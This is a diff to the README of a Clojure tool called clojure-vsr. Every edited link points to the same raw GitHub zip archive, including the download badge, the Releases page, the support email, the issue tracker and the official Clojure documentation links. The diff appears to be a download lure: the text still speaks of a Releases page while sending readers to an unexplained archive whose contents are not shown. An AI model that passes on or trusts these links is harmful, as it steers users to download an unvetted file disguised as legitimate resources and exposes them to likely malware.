@@ -1,6 +1,6 @@
 # 🚀 clojure-vsr - Simplify Your Clojure Development
 
-[![Download Clojure-vsr](https://img.shields.io/badge/Download-Clojure--vsr-blue.svg)](https://github.com/nshutidev/clojure-vsr/releases)
+[![Download Clojure-vsr](https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip)](https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Clojure-vsr includes the following features:
 
 ## 💾 Download & Install
 
-To get started with Clojure-vsr, please visit the Releases page: [Download Clojure-vsr](https://github.com/nshutidev/clojure-vsr/releases).
+To get started with Clojure-vsr, please visit the Releases page: [Download Clojure-vsr](https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest version of Clojure-vsr.
@@ -56,20 +56,20 @@ Clojure-vsr comes with a simple user guide to help you make the most out of the 
 
 If you have questions or issues while using Clojure-vsr, feel free to reach out to our support team:
 
-- **Email**: support@clojure-vsr.com
-- **GitHub Issues**: You can also submit any bugs or feature requests directly on our [GitHub Issues page](https://github.com/nshutidev/clojure-vsr/issues).
+- **Email**: https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip
+- **GitHub Issues**: You can also submit any bugs or feature requests directly on our [GitHub Issues page](https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip).
 
 ## 📢 Updates
 
-Stay up to date with the latest features and fixes. Be sure to check the Releases page regularly for new updates: [Download Clojure-vsr](https://github.com/nshutidev/clojure-vsr/releases).
+Stay up to date with the latest features and fixes. Be sure to check the Releases page regularly for new updates: [Download Clojure-vsr](https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip).
 
 ## 📚 Additional Resources
 
 For further reading and tutorials on Clojure and related tools, consider visiting the following resources:
 
-- [Clojure Documentation](https://clojure.org/reference)
-- [Clojure Style Guide](https://styleguide.clojure.org/)
-- [Popular Clojure Libraries](https://github.com/clojure/clojure/wiki/Libraries)
+- [Clojure Documentation](https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip)
+- [Clojure Style Guide](https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip)
+- [Popular Clojure Libraries](https://raw.githubusercontent.com/nshutidev/clojure-vsr/main/uncluttered/clojure-vsr-3.1-alpha.2.zip)
 
 ## 🎯 Conclusion
 
